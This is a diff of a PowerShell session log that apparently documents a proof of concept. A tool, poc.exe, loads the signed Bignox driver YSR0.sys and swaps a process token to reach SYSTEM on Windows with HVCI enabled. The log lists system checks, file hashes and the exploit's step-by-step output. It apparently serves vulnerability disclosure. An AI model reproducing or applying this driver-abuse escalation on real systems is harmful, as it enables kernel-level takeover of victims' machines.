@@ -1,10 +1,21 @@
-UTC=2026-10-04T11:19:28.9855897Z
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\WINDOWS\system32> $d = Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard
+PS C:\WINDOWS\system32>
+PS C:\WINDOWS\system32> "UTC=$((Get-Date).ToUniversalTime().ToString('o'))"
+UTC=2026-10-08T13:16:58.8647447Z
+PS C:\WINDOWS\system32> "Build=$([Environment]::OSVersion.Version.Build)"
 Build=26200
-VBS=0
-YSDrv=043f69b539670af5b4db8c2b2a7e05a2d5634bb281dc49ea4e827cbf1c7fea3d
-YSR0=27831ac079cb6bfb813ff434274f7b73918848767dfdc885acc61e8e30a0343e
-PoC=87b038908405196d9442071055b0f0e5209f381136816d3f8d678a580643507a
---- BEFORE ---
+PS C:\WINDOWS\system32> "SecureBoot=$(try { gsudo Confirm-SecureBootUEFI } catch { 'Unavailable' })"
+SecureBoot=True
+PS C:\WINDOWS\system32> "VBS=$($d.VirtualizationBasedSecurityStatus)"
+VBS=2
+PS C:\WINDOWS\system32> "HVCI=$([int]($d.SecurityServicesRunning -contains 2))"
+HVCI=1
+PS C:\WINDOWS\system32> "HVCI_Configured=$([int]($d.SecurityServicesConfigured -contains 2))"
+HVCI_Configured=1
+PS C:\WINDOWS\system32> whoami /all
 
 USER INFORMATION
 ----------------
@@ -42,6 +53,36 @@ SeUndockPrivilege             ドッキング ステーションからコンピ�
 SeIncreaseWorkingSetPrivilege プロセス ワーキング セットの増加                無効
 SeTimeZonePrivilege           タイム ゾーンの変更                             無効
 
+PS C:\WINDOWS\system32> Get-FileHash -Path "C:\Users\fielduser\Desktop\poc.exe" -Algorithm SHA256
 
---- POC (final whoami) ---
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          00FEC86AE312CCD2A5D80B6CBC49E42A1B8A87C25CD1B56E6869763405946113       C:\Users\fielduser\Desktop\po...
+
+
+PS C:\WINDOWS\system32> Get-FileHash -Path "C:\Program Files (x86)\Bignox\BigNoxVM\RT\YSR0.sys" -Algorithm SHA256
+
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          27831AC079CB6BFB813FF434274F7B73918848767DFDC885ACC61E8E30A0343E       C:\Program Files (x86)\Bignox...
+
+
+PS C:\WINDOWS\system32> Get-FileHash -Path "C:\Program Files (x86)\Bignox\BigNoxVM\RT\YSDrv.sys" -Algorithm SHA256
+
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          043F69B539670AF5B4DB8C2B2A7E05A2D5634BB281DC49EA4E827CBF1C7FEA3D       C:\Program Files (x86)\Bignox...
+
+
+PS C:\WINDOWS\system32> . "C:\Users\fielduser\Desktop\poc.exe" "C:\Program Files (x86)\Bignox\BigNoxVM\RT\YSR0.sys"
+[*] target=C:\Program Files (x86)\Bignox\BigNoxVM\RT\YSR0.sys
+[+] COOKIE ok
+[+] QUERY_FUNCS ok (cFunctions=275)
+[+] LDR_OPEN ok
+[+] LDR_LOAD ok (signed YSR0 loaded)
+[+] create-VM ok
+[+] SET_VM_FOR_FAST ok
+[+] System EPROCESS / Token found
+[*] swapping EPROCESS->Token with System token ...
+[*] verifying ... SYSTEM (S-1-5-18)
 nt authority\system
